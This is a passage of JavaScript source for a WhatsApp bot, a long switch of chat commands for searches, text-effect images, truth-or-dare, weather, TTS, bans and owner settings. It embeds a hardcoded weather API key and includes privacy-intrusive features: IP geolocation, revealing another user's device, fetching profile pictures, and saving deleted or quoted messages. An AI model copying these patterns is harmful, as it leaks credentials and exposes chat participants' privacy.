                 `   Description: ${repo.description || 'No description'}\n` +
                 `   Clone URL: ${repo.cloneUrl}\n\n`;
    });
m.reply(message)
    /*/ sending messages with a list of repositories 
    await ednut.sendMessage(m.chat, {
      text: message,
    });*/

  } catch (e) {
    // if catch error
    await ednut.sendMessage(m.chat, `can't searh stickers error`);
  }
};
break

case 'npmsearch':{
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(msg.ban)
if (!text) return m.reply(example(`axios`))
	let res = await fetch(`http://registry.npmjs.com/-/v1/search?text=${text}`)
	let { objects } = await res.json()
	if (!objects.length) throw `Query "${text}" not found :/`
	let txt = objects.map(({ package: pkg }) => {
		return `*${pkg.name}* (v${pkg.version})\n_${pkg.links.npm}_\n_${pkg.description}_`
	}).join`\n\n`
	m.reply(txt)
}
break

case 'xvideosearch':{
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(msg.ban)
  if (!text) return m.reply(example(`Milf`))
  try {
    // checking data from api
    let res = await fetch(`https://api.agatz.xyz/api/xvideo?message=${encodeURIComponent(text)}`);
    let json = await res.json();

    // checking api response status
    if (json.status !== 200 || !json.data || json.data.length === 0) {
      throw 'No videos found for this keyword.';
    }

    // fetching search data from api
    let videos = json.data;
    let message = `Arch Md xvideo search result\n\n *"${text}"*:\n`;

    // Composing messages with video information
    videos.forEach(video => {
      message += `Title: ${video.title || 'no name'}\n` +
                 `  Duration: ${video.duration || 'no duration'}\n` +
                 `  URL: ${video.url || 'no URL'}\n` +
                 `  Thumbnail: ${video.thumb || 'no thumbnail'}\n\n`;
    });

    // Sending messages with video lists
    await ednut.sendMessage(m.chat, {
      text: message,
    });

  } catch (e) {
    // Handling errors and sending error messages
    await ednut.sendMessage(m.chat, `can't fetch result from query`);
  }
}
break


case 'xnxxsearch':{
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(msg.ban)
  if (!text) return m.reply(example(`stepmoms`))
  let response = await fetch(`https://api.agatz.xyz/api/xnxx?message=${text}`);
  let res = await response.json();

  if (res.status !== 200) throw `API Error: ${res.creator}`;

  let resultText = '';
  for (let i = 0; i < res.data.result.length; i++) {
    let result = res.data.result[i];
    let hasil = `• Title: *${result.title}*\n• Info: *${result.info}*\n• Link: *${result.link}*\n`;
    resultText += hasil + '\n';
  }

  let name = m.sender;
  // result from contextInfo
  await ednut.sendMessage(m.chat, {
    text: resultText
  });
};
break

           case 'glitchtext':
case 'writetext':
case 'advancedglow':
case 'typographytext':
case 'pixelglitch':
case 'neonglitch':
case 'flagtext':
case 'flag3dtext':
case 'deletingtext':
case 'blackpinkstyle':
case 'glowingtext':
case 'underwatertext':
case 'logomaker':
case 'cartoonstyle':
case 'papercutstyle':
case 'watercolortext':
case 'effectclouds':
case 'blackpinklogo':
case 'gradienttext':
case 'summerbeach':
case 'luxurygold':
case 'multicoloredneon':
case 'sandsummer':
case 'galaxywallpaper':
case '1917style':
case 'makingneon':
case 'royaltext':
case 'freecreate':
case 'galaxystyle':
case 'lighteffects':{
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(msg.ban)
if (!text) return m.reply(example(`Arch Md`))
let link
if (/glitchtext/.test(command)) link = 'https://en.ephoto360.com/create-digital-glitch-text-effects-online-767.html'
if (/writetext/.test(command)) link = 'https://en.ephoto360.com/write-text-on-wet-glass-online-589.html'
if (/advancedglow/.test(command)) link = 'https://en.ephoto360.com/advanced-glow-effects-74.html'
if (/typographytext/.test(command)) link = 'https://en.ephoto360.com/create-typography-text-effect-on-pavement-online-774.html'
if (/pixelglitch/.test(command)) link = 'https://en.ephoto360.com/create-pixel-glitch-text-effect-online-769.html'
if (/neonglitch/.test(command)) link = 'https://en.ephoto360.com/create-impressive-neon-glitch-text-effects-online-768.html'
if (/flagtext/.test(command)) link = 'https://en.ephoto360.com/nigeria-3d-flag-text-effect-online-free-753.html'
if (/flag3dtext/.test(command)) link = 'https://en.ephoto360.com/free-online-american-flag-3d-text-effect-generator-725.html'
if (/deletingtext/.test(command)) link = 'https://en.ephoto360.com/create-eraser-deleting-text-effect-online-717.html'
if (/blackpinkstyle/.test(command)) link = 'https://en.ephoto360.com/online-blackpink-style-logo-maker-effect-711.html'
if (/glowingtext/.test(command)) link = 'https://en.ephoto360.com/create-glowing-text-effects-online-706.html'
if (/underwatertext/.test(command)) link = 'https://en.ephoto360.com/3d-underwater-text-effect-online-682.html'
if (/logomaker/.test(command)) link = 'https://en.ephoto360.com/free-bear-logo-maker-online-673.html'
if (/cartoonstyle/.test(command)) link = 'https://en.ephoto360.com/create-a-cartoon-style-graffiti-text-effect-online-668.html'
if (/papercutstyle/.test(command)) link = 'https://en.ephoto360.com/multicolor-3d-paper-cut-style-text-effect-658.html'
if (/watercolortext/.test(command)) link = 'https://en.ephoto360.com/create-a-watercolor-text-effect-online-655.html'
if (/effectclouds/.test(command)) link = 'https://en.ephoto360.com/write-text-effect-clouds-in-the-sky-online-619.html'
if (/blackpinklogo/.test(command)) link = 'https://en.ephoto360.com/create-blackpink-logo-online-free-607.html'
if (/gradienttext/.test(command)) link = 'https://en.ephoto360.com/create-3d-gradient-text-effect-online-600.html'
if (/summerbeach/.test(command)) link = 'https://en.ephoto360.com/write-in-sand-summer-beach-online-free-595.html'
if (/luxurygold/.test(command)) link = 'https://en.ephoto360.com/create-a-luxury-gold-text-effect-online-594.html'
if (/multicoloredneon/.test(command)) link = 'https://en.ephoto360.com/create-multicolored-neon-light-signatures-591.html'
if (/sandsummer/.test(command)) link = 'https://en.ephoto360.com/write-in-sand-summer-beach-online-576.html'
if (/galaxywallpaper/.test(command)) link = 'https://en.ephoto360.com/create-galaxy-wallpaper-mobile-online-528.html'
if (/1917style/.test(command)) link = 'https://en.ephoto360.com/1917-style-text-effect-523.html'
if (/makingneon/.test(command)) link = 'https://en.ephoto360.com/making-neon-light-text-effect-with-galaxy-style-521.html'
if (/royaltext/.test(command)) link = 'https://en.ephoto360.com/royal-text-effect-online-free-471.html'
if (/freecreate/.test(command)) link = 'https://en.ephoto360.com/free-create-a-3d-hologram-text-effect-441.html'
if (/galaxystyle/.test(command)) link = 'https://en.ephoto360.com/create-galaxy-style-free-name-logo-438.html'
if (/lighteffects/.test(command)) link = 'https://en.ephoto360.com/create-light-effects-green-neon-online-429.html'
let haldwhd = await ephoto(link, text)
ednut.sendMessage(m.chat, { image: { url: haldwhd }, caption: `ᴀʀᴄʜ ᴍᴅ ²⁵` }, { quoted: m })
}
break

case 'getdevice':
case 'device':
case 'phone': {
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(msg.ban)
if (!m.quoted) return m.reply(example(`reply to a chat`))
await ednut.sendMessage(m.chat, {text: `_@${m.quoted.sender.split('@')[0]} is using ${await getDevice(m.quoted.id)}_`, contextInfo: { mentionedJid: [m.quoted.sender] } }, {quoted: m})
}
break

case "owner": {
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
await ednut.sendContact(m.chat, [`${global.owner}`], `Chat ${ownername}`, null, {contextInfo: {
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true, 
thumbnail: `${global.thumb}`, 
title: `© ${global.botname}`, 
renderLargerThumbnail: true, 
sourceUrl: `https://wa.me/${global.owner}`,
mediaType: 1
}}})
}
break

case 'readmore': {
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(msg.ban)
const more = String.fromCharCode(8206)
const readmore = more.repeat(4001)
let [l, r] = text.split`|`
    if (!l) l = ''
    if (!r) r = ''
await ednut.sendMessage(m.chat, {text: l + readmore + r}, {quoted: m})
}
break;

case 'setppbot': {
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(msg.ban)
				if (!isOwner) return m.reply(msg.owner)
				if (!quoted) return m.reply(example(`reply image`))
				if (!/image/.test(mime)) return m.reply(`Send/Reply Image With Caption ${prefix + command}`)
				if (/webp/.test(mime)) return m.reply(`Send/Reply Image With Caption ${prefix + command}`)
				let media = await ednut.downloadAndSaveMediaMessage(quoted)
				await ednut.updateProfilePicture(botNumber, { url: media }).catch((err) => fs.unlinkSync(media))
			}
			break
	
			case 'deleteppbot': 
			case 'delppbot': {
			if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(msg.ban)
				if (!isOwner) return m.reply(msg.owner);
				await ednut.removeProfilePicture(ednut.user.id)
			}
			break;

case 'trackip':
{
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(msg.ban)
if (!text) return m.reply(example(`112.90.150.204`))
try {
let res = await fetch(`https://ipwho.is/${text}`).then(result => result.json());

const formatIPInfo = (info) => {
 return `
*IP Information*
• IP: ${info.ip || 'N/A'}
• Success: ${info.success || 'N/A'}
• Type: ${info.type || 'N/A'}
• Continent: ${info.continent || 'N/A'}
• Continent Code: ${info.continent_code || 'N/A'}
• Country: ${info.country || 'N/A'}
• Country Code: ${info.country_code || 'N/A'}
• Region: ${info.region || 'N/A'}
• Region Code: ${info.region_code || 'N/A'}
• City: ${info.city || 'N/A'}
• Latitude: ${info.latitude || 'N/A'}
• Longitude: ${info.longitude || 'N/A'}
• Is EU: ${info.is_eu ? 'Yes' : 'No'}
• Postal: ${info.postal || 'N/A'}
• Calling Code: ${info.calling_code || 'N/A'}
• Capital: ${info.capital || 'N/A'}
• Borders: ${info.borders || 'N/A'}
• Flag:
 - Image: ${info.flag?.img || 'N/A'}
 - Emoji: ${info.flag?.emoji || 'N/A'}
 - Emoji Unicode: ${info.flag?.emoji_unicode || 'N/A'}
• Connection:
 - ASN: ${info.connection?.asn || 'N/A'}
 - Organization: ${info.connection?.org || 'N/A'}
 - ISP: ${info.connection?.isp || 'N/A'}
 - Domain: ${info.connection?.domain || 'N/A'}
• Timezone:
 - ID: ${info.timezone?.id || 'N/A'}
 - Abbreviation: ${info.timezone?.abbr || 'N/A'}
 - Is DST: ${info.timezone?.is_dst ? 'Yes' : 'No'}
 - Offset: ${info.timezone?.offset || 'N/A'}
 - UTC: ${info.timezone?.utc || 'N/A'}
 - Current Time: ${info.timezone?.current_time || 'N/A'}
`;
};
 
if (!res.success) throw new Error(`IP ${text} not found!`);
await ednut.sendMessage(m.chat, { location: { degreesLatitude: res.latitude, degreesLongitude: res.longitude } }, { ephemeralExpiration: 604800 });
const delay = (ms) => new Promise(resolve => setTimeout(resolve, ms));
await delay(2000);
m.reply(formatIPInfo(res)); 
} catch (e) { 
await m.reply(`Error: Unable to retrieve data for IP ${text}`);
}
}
break

case 'fancy': case 'styletext': {
  if (m.isGroup) {
    if (global.db.groups[m.chat].banned) return
  }
  if (global.db.users[m.sender].banned) return m.reply(msg.ban)
  if (!text) return m.reply(example('Enter Query text!'))
  let args = text.split(' ')
  let styleNumber = parseInt(args[0])
  let query = text.replace(args[0], '').trim()
  if (isNaN(styleNumber) || !query) {
    let anu = await styletext(text)
    let teks = `eg use ${prefix}fancy 2 text for a specific text\nStyle Text: ${text}\n`
    for (let i = 0; i < anu.length; i++) {
      teks += `${i + 1}. ${anu[i].name} : ${anu[i].result}\n\n`
    }
    return await m.reply(teks)
  }
  let anu = await styletext(query)
  if (styleNumber && anu[styleNumber - 1]) {
    return m.reply(anu[styleNumber - 1].result)
  } else {
    return m.reply('Invalid style number')
  }
} 
break

case 'charge': {
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(msg.ban)
const { performance } = require('perf_hooks'); // For measuring latency
let startTime = performance.now(); // Start time
// Construct the initial message
let initialMessage = 
 `battery 🪫 low
╔═══════════╗
║░░░░░░░░░░░╚╗
║░░░░░1%░░░░░░║
║░░░░░░░░░░░╔╝
╚═══════════╝`;

try {
// Send the initial message and get the message ID
let sentMessage = await ednut.sendMessage(m.chat, { text: initialMessage });
let initialMessageId = sentMessage.key.id; // Use sentMessage.key.id for the message ID
// Schedule the first edit after 2 seconds
setTimeout(async () => {
try {
await ednut.sendMessage(m.chat, {
text: `🪫 _Charging..._
╔═══════════╗
║██░░░░░░░░░╚╗
║██░░░⚡░░░░░░║
║██░░░░░░░░░╔╝
╚═══════════╝`,
edit: { remoteJid: m.chat, id: initialMessageId }
});
console.log('First edit successful.');
} catch (error) {
console.error('Error during first edit:', error);
}
}, 2000); // 2000 ms = 2 seconds
// Schedule the second edit after 4 seconds
setTimeout(async () => {
try {
await ednut.sendMessage(m.chat, {
text: `🪫 _Charging..._
╔═══════════╗
║████░░░░░░░╚╗
║████░30%░░░░░║
║████░░░░░░░╔╝
╚═══════════╝`,
edit: { remoteJid: m.chat, id: initialMessageId }
});
console.log('Second edit successful.');
} catch (error) {
console.error('Error during second edit:', error);
}
}, 4000); // 4000 ms = 4 seconds
// Schedule the third edit after 6 seconds
setTimeout(async () => {
try {
await ednut.sendMessage(m.chat, {
text: `🔋 _Charging..._
╔═══════════╗
║██████░░░░░╚╗
║█████░50%░░░░║
║██████░░░░░╔╝
╚═══════════╝`,
edit: { remoteJid: m.chat, id: initialMessageId }
});
console.log('Third edit successful.');
} catch (error) {
console.error('Error during third edit:', error);
}
}, 6000); // 6000 ms = 6 seconds
// Schedule the fourth edit after 8 seconds
setTimeout(async () => {
try {
await ednut.sendMessage(m.chat, {
text: `🔋 _Charging..._
╔═══════════╗
║█████████░░╚╗
║███░75%░░█░░░║
║█████████░░╔╝
╚═══════════╝`,
edit: { remoteJid: m.chat, id: initialMessageId }
});
console.log('Fourth edit successful.');
} catch (error) {
console.error('Error during fourth edit:', error);
}
}, 8000); // 8000 ms = 8 seconds

// Schedule the fifth edit after 10 seconds
setTimeout(async () => {
try {
await ednut.sendMessage(m.chat, {
text: `🔋~_.Charged._~
╔═══════════╗
║███████████╚╗
║███░100%░████║
║███████████╔╝
╚═══════════╝`,
edit: { remoteJid: m.chat, id: initialMessageId }
});
console.log('Fifth edit successful.');
} catch (error) {
console.error('Error during fifth edit:', error);
}
}, 10000); // 10000 ms = 10 seconds
// Schedule the final message after 12 seconds
setTimeout(async () => {
try {
await ednut.sendMessage(m.chat, {
text: ` 💜😽𝙳𝚎𝚊𝚛 reader 🌚❤️

       ｡ﾟﾟ･｡･ﾟﾟ｡
         ﾟ。        ｡ﾟ
             ﾟ･｡･ﾟ
       ︵               ︵
    (        ╲       /       /
      ╲          ╲/       /
           ╲          ╲  /
          ╭ ͡   ╲           ╲
     ╭ ͡   ╲        ╲       ﾉ
╭ ͡   ╲        ╲         ╱
 ╲       ╲          ╱
      ╲         ╱
          ︶
> -𝙸 𝚕𝚘𝚟𝚎 𝚞 𝚌𝚊𝚗 𝚒 𝚐𝚎𝚝 𝚒𝚝 𝚋𝚊𝚌𝚔🥺♥️
> 𝐂𝐫𝐞𝐝𝐢𝐭:- Silentzbotid`,
edit: { remoteJid: m.chat, id: initialMessageId }
});
console.log('Final edit successful.');
} catch (error) {
console.error('Error during final edit:', error);
}
}, 12000); // 12000 ms = 12 seconds
} catch (error) {
console.error('Error sending initial message:', error);
}
}
break;


case 'support': {
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(msg.ban)
const support = `channel:- https://whatsapp.com/channel/0029VbAQfFGBVJl6W26JXy2n\n\ngroup1:- https://chat.whatsapp.com/JEqGxcldMOP0wojK4TTstw\n\ngroup2:- https://chat.whatsapp.com/GmHOFOqQsM8A160ZCjcVnb!`
m.reply(support)
}
break

case 'steal': case 'stickerwm': case 'take': case 'wm': {
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(msg.ban)
if (!/image|video/.test(mime)) return m.reply(example("reply to a sticker to steal"))   
const getRandom = (ext) => {
return `${Math.floor(Math.random() * 10000)}${ext}`
  }
	let ahuh = args.join(' ').split('|')
	let satu = ahuh[0] !== '' ? ahuh[0] : (m.pushName)
	let dua = typeof ahuh[1] !== 'undefined' ? ahuh[1] : ``
	let { Sticker, createSticker, StickerTypes } = require('wa-sticker-formatter')
	let media = await ednut.downloadAndSaveMediaMessage(quoted)
	let jancok = new Sticker(media, {
	pack: satu, // The pack name
	author: dua, // The author name
	type: StickerTypes.FULL, // The sticker type
	categories: ['🤩', '🎉'], // The sticker category
	id: '12345', // The sticker id
	quality: 70, // The quality of the output file
	background: '#FFFFFF00' // The sticker background color (only for full stickers)
	})
	let stok = getRandom(".webp")
	let nono = await jancok.toFile(stok)
	let nah = fs.readFileSync(nono)
	await ednut.sendMessage(m.chat,{sticker: nah},{quoted: m})
	await fs.unlinkSync(stok)
	await fs.unlinkSync(media)
}
break
			
			case 'dare':
			if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(msg.ban)
              const dare =[             
"Send a funny face selfie to the group", "Tell a secret about yourself that no one knows", "Sing a song out loud and record it, then send it to the group", "Do 10 push-ups and send a video as proof", "Send a voice note saying 'I love you' to a random contact", "Share your most embarrassing moment", "Send a photo of your favorite food", "Write a short poem and share it with the group", "Do a funny dance and send a video", "Call a friend and have a 5-minute conversation in a made-up language", "Send a photo of your bedroom", "Share your biggest fear", "Send a voice note of you singing a popular song", "Tell a joke and make everyone laugh", "Send a photo of your favorite hobby", "Write a short story and share it with the group", "Do 5 jumping jacks and send a video as proof", "Share your favorite quote", "Send a photo of your favorite book", "Call a friend and have a 10-minute conversation without laughing", "Send a voice note saying 'I'm sorry' to someone you wronged", "Share your most proud moment", "Send a photo of your favorite sports team", "Write a love letter to your crush", "Do a funny impression of a friend and send a video", "Share your biggest regret", "Send a photo of your favorite animal", "Tell a scary story and make everyone believe it", "Send a voice note of you rapping a popular song", "Share your favorite travel destination", "Send a photo of your favorite type of music", "Write a poem about a friend and share it with the group", "Do 10 sit-ups and send a video as proof", "Share your favorite type of food", "Send a photo of your favorite type of car", "Tell a joke in a made-up language", "Send a voice note saying 'Thank you' to someone who helped you", "Share your most embarrassing habit", "Send a photo of your favorite type of music instrument", "Write a short script and act it out with friends", "Do a funny skit and send a video", "Share your favorite type of sport", "Send a photo of your favorite type of pet", "Tell a story about a friend's embarrassing moment", "Send a voice note of you beatboxing a popular song", "Share your favorite type of video game", "Send a photo of your favorite type of movie", "Write a love letter to your best friend", "Do a funny magic trick and send a video", "Share your favorite type of TV show"
]
              const archdare = dare[Math.floor(Math.random() * dare.length)]
              await ednut.sendMessage(m.chat, {text: archdare}, {quoted: m})
              break
              
              	case 'truth':
              	if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(msg.ban)
              const truth =[
"If you could go back in time, what would you change?", "What's the biggest lie you've ever told?", "What's your deepest fear?", "What's the one thing you can't live without?", "Who's your celebrity crush?", "What's the most embarrassing thing that's ever happened to you?", "What's your biggest regret?", "What's the one thing you're proud of accomplishing?", "If you could switch lives with someone for a day, who would it be?", "What's the biggest secret you've ever kept?", "What's your favorite childhood memory?", "What's the one thing you're looking forward to doing in the next year?", "If you could travel anywhere in the world, where would you go?", "What's your favorite hobby and why do you enjoy it?", "What's the most spontaneous thing you've ever done?", "What's your favorite type of music and why?", "If you could have dinner with any historical figure, who would it be?", "What's the biggest risk you've ever taken?", "What's your favorite type of book and why?", "If you could go on a date with any celebrity, who would it be?", "What's the one thing you're most proud of about yourself?", "What's your favorite type of movie and why?", "If you could switch lives with your parents for a day, what would you do?", "What's the biggest lesson you've learned from a past relationship?", "What's your favorite type of food and why?", "If you could have any superpower, what would it be?", "What's the one thing you're most grateful for in your life?", "What's your favorite type of sport and why?", "If you could go back and give advice to your younger self, what would it be?", "What's the biggest challenge you've faced and how did you overcome it?", "What's your favorite type of music festival and why?", "If you could have a 30-minute conversation with your future self, what would you ask?", "What's the one thing you're most looking forward to doing in the next 5 years?", "What's your favorite type of vacation and why?", "If you could have any type of pet, what would it be?", "What's the biggest thing you're currently struggling with?", "What's your favorite type of holiday and why?", "If you could go on a road trip with any celebrity, who would it be?", "What's the one thing you're most proud of accomplishing in the past year?", "What's your favorite type of restaurant and why?"
]
              const archtruth = truth[Math.floor(Math.random() * truth.length)]
              await ednut.sendMessage(m.chat, {text: archtruth}, {quoted: m})
              break
              
case 'weather':{
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(msg.ban)
if (!text) return m.reply(example('location'))
            let wdata = await axios.get(
                `https://api.openweathermap.org/data/2.5/weather?q=${text}&units=metric&appid=060a6bcfa19809c2cd4d97a212b19273&language=en`
            );
            let textw = ""
            textw += `*🗺️Weather of  ${text}*\n\n`
            textw += `*Weather:-* ${wdata.data.weather[0].main}\n`
            textw += `*Description:-* ${wdata.data.weather[0].description}\n`
            textw += `*Avg Temp:-* ${wdata.data.main.temp}\n`
            textw += `*Feels Like:-* ${wdata.data.main.feels_like}\n`
            textw += `*Pressure:-* ${wdata.data.main.pressure}\n`
            textw += `*Humidity:-* ${wdata.data.main.humidity}\n`
            textw += `*Humidity:-* ${wdata.data.wind.speed}\n`
            textw += `*Latitude:-* ${wdata.data.coord.lat}\n`
            textw += `*Longitude:-* ${wdata.data.coord.lon}\n`
            textw += `*Country:-* ${wdata.data.sys.country}\n`

           ednut.sendMessage(
                m.chat, {
                    text: textw,
                }, {
                    quoted: m,
                }
           )
           }
           break

case 'getpp': 
case 'pp': {
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(msg.ban)
  let users = m.mentionedJid[0] || (m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net')
  try {
    avatar = await ednut.profilePictureUrl(users, "image")
  } catch {
    avatar = 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'
  }
  await ednut.sendMessage(m.chat, {image: {url: avatar }, caption: `Profile picture of @${users.split('@')[0]}`, contextInfo: { mentionedJid: [users] } }, {quoted: m })
} 
break

case 'ban': {
if (!isOwner) return m.reply(msg.owner)
let Ednut = '2347036214381'
let user = m.mentionedJid[0] || (m.quoted ? m.quoted.sender : '')
if (!user) return m.reply(example('Reply or tag a user!'))
if (user === botNumber) return m.reply('I cannot ban myself!')
if (user === Ednut +"@s.whatsapp.net") return m.reply('I cannot ban my Creator!')
if (!global.db.users[user]) global.db.users[user] = {}
if (global.db.users[user].banned) return m.reply(`User ${user.split('@')[0]} is already banned!`)
global.db.users[user].banned = true
m.reply(`User ${user.split('@')[0]} has been banned from using the bot command!`)
}
break

case 'unban': {
if (!isOwner) return m.reply(msg.owner)
let user = m.mentionedJid[0] || (m.quoted ? m.quoted.sender : '')
if (!user) return m.reply(example('Reply or tag a user!'))
if (!global.db.users[user]) global.db.users[user] = {}
if (!global.db.users[user].banned) return m.reply(`User ${user.split('@')[0]} is not banned!`)
global.db.users[user].banned = false
m.reply(`User ${user.split('@')[0]} has been unbanned and can now use the bot!`)
}
break

case 'say': case 'tts': case 'gtts':{
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(msg.ban)
    try {
    let text = (args.length > 1) ? args.slice(1).join(" ") : q;
     if (!text){
        return m.reply(`*Missing text!*\n\nUse one of the following voice styles:\n
🔊 *Available Voices:*
• \`male\` – American Male (default)
• \`female\` – British Female
• \`deep\` – Deep Male
• \`slow\` – Slower Speech
• \`fast\` – Faster Speech
• \`ng\` – Nigerian Accent
• \`au\` – Australian Accent

📝 *Usage Examples:*
• .tts male Hello there
• .tts female Welcome to the group
• .tts deep This is a deep voice
• .tts ng How are you all today?

Use any style + your text after the command.`);
      }
      
      let voiceLanguage = 'en-US';
      let speed = false;
      const style = args[0]?.toLowerCase();
      
      switch (style) {
        case "male":
          voiceLanguage = "en-US";
          break;
        case "female":
          voiceLanguage = "en-GB";
          break;
        case "deep":
          voiceLanguage = "en-IN";
          break;
        case "slow":
          speed = true;
          break;
        case "fast":
          speed = false;
          break;
        case "ng":
          voiceLanguage = "en-NG";
          break;
        case "au":
          voiceLanguage = "en-AU";
          break;
        default:
          voiceLanguage = "en-US";
      }
  
      if (text.length > 200) return m.reply("❌ Please keep the text under 200 characters.");
      
      const url = googleTTS.getAudioUrl(text, {
        lang: voiceLanguage,
        slow: speed,
        host: 'https://translate.google.com'
      });
      
      await ednut.sendMessage(from, {
        audio: { url },
        mimetype: 'audio/mpeg',
        ptt: true
      }, { quoted: m });
      
    } catch (err) {
      console.error("TTS Error:", err);
      m.reply("❌ Error generating speech. Try again later.");
    }
}
break
        
case 'repo': case 'repository': {
  try {
    const response = await axios.get(`https://api.github.com/repos/Ednut001/Arch-Md`)
    if (response.status === 200) {
      const repoData = response.data
      const formattedInfo = `*Repository Name :* ${repoData.name}\n*Description :* ${repoData.description}\n*Owner :* ${repoData.owner.login}\n*Stars :* ${repoData.stargazers_count}\n*Forks :* ${repoData.forks_count}\n*session :* ${global.scan}\n\n*URL :* ${repoData.html_url}\n`;
      reply4(formattedInfo);
    } else {
      await m.reply(`Unable to fetch repository information`)
    }
  } catch (error) {
    console.error(error)
    await m.reply(`Repository currently not available `)
  }
}
break

case 'twitter': case 'twitterdl': case 'twitterdl': {
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
    if (global.db.users[m.sender].banned) return m.reply(msg.ban)
	if (!args[0]) return m.reply(example(`media link`))
	if (!isUrl(args[0]) && !args[0].includes('twitter.com')) return m.reply('Link Invalid!')
          try {
          let { SD, HD, desc, thumb, audio } = await api.twitter(args[0])
          let te = ` 
° Description: ${desc}\n\n© ᴀʀᴄʜ ᴍᴅ ²⁵`
ednut.sendMessage(m.chat, {video: {url:HD}, caption: te}, {quoted: m})
} catch (e) {
  	m.reply(`Verify that the link is from Twitter`)
	}
}
break

  case 'banchat':
  case 'bangc':{
    if (!m.isGroup) return m.reply(msg.group)
    if (!isOwner) return m.reply(msg.owner)
    if (!global.db.groups[m.chat]) global.db.groups[m.chat] = {}
    if (global.db.groups[m.chat].banned === true) return m.reply('this group has already been banned from using the bot command earlier!')
    global.db.groups[m.chat].banned = true
    m.reply(`Ban group feature enabled ${botname} won't work here!`)
    }
    break;
    

case 'autobio': {
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(msg.ban)
if (!isOwner) return m.reply(msg.owner)
if (args[0] === 'on') {
if (global.db.settings.autobio === true) return m.reply('Auto bio already enabled!')
global.db.settings.autobio = true
m.reply('Auto bio enabled!')
} else if (args[0] === 'off') {
if (global.db.settings.autobio === false) return m.reply('Auto bio already disabled!')
global.db.settings.autobio = false
m.reply('Auto bio disabled!')
} else {
m.reply(example('on/off'))
}
}
break;

case 'antidelete': {
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(msg.ban)
if (!isOwner) return m.reply(msg.owner)
if (args[0] === 'on') {
if (global.db.settings.antidelete === true) return m.reply('Antidelete already enabled!')
global.db.settings.antidelete = true
m.reply('Antidelete enabled!')
} else if (args[0] === 'off') {
if (global.db.settings.antidelete === false) return m.reply('Antidelete already disabled!')
global.db.settings.antidelete = false
m.reply('Antidelete disabled!')
} else {
m.reply(example('on/off'))
}
}
break;

case 'autolevelup': {
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(msg.ban)
if (!isOwner) return m.reply(msg.owner)
if (args[0] === 'on') {
if (global.db.settings.levelup === true) return m.reply('Autolevelup already enabled!')
global.db.settings.levelup = true
m.reply('Autolevelup enabled!')
} else if (args[0] === 'off') {
if (global.db.settings.levelup === false) return m.reply('Autolevelup already disabled!')
global.db.settings.levelup = false
m.reply('Autolevelup disabled!')
} else {
m.reply(example('on/off'))
}
}
break;


case 'download':
case 'save':
case 'sv': {
  if (m.isGroup) {
    if (global.db.groups[m.chat].banned) return
  }
  if (global.db.users[m.sender].banned) return m.reply(msg.ban)
  if (!isOwner) return
  let quotedMessage = m.msg.contextInfo.quotedMessage
  if (!quotedMessage) return m.reply(example("message or reply to chat or media"))
  if (quotedMessage) {
    if (quotedMessage.conversation) {
      ednut.sendMessage(botNumber, { text: quotedMessage.conversation},{quoted: m})
    }
    if (quotedMessage) {
      if (quotedMessage.imageMessage) {
        let imageCaption = quotedMessage.imageMessage.caption;
        let imageUrl = await ednut.downloadAndSaveMediaMessage(quotedMessage.imageMessage);
        ednut.sendMessage(botNumber, { image: { url: imageUrl }, caption: imageCaption},{quoted: m});
      }
       if (quotedMessage) {
      if (quotedMessage.audioMessage) {;
        let audioUrl = await ednut.downloadAndSaveMediaMessage(quotedMessage.audioMessage);
        ednut.sendMessage(botNumber, {audio: {url: audioUrl}, mimetype: "audio/mpeg"},{quoted: m})
      }
      if (quotedMessage.videoMessage) {
        let videoCaption = quotedMessage.videoMessage.caption;
        let videoUrl = await ednut.downloadAndSaveMediaMessage(quotedMessage.videoMessage);
        ednut.sendMessage(botNumber, { video: { url: videoUrl }, caption: videoCaption}, {quoted: m});
      }
    }
    }
  }
}
break

case 'unbanchat':
case 'unbangc': {
if (!m.isGroup) return m.reply(msg.group)
if (!isOwner) return m.reply(msg.owner)
if (!global.db.groups[m.chat]) global.db.groups[m.chat] = {}
if (global.db.groups[m.chat].banned === false) return m.reply('This group is not banned from using the bot command!')
global.db.groups[m.chat].banned = false
m.reply(`Ban group feature disabled ${botname} can now be used here!`)
}
break;

case "autosend": case "astatus": {
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
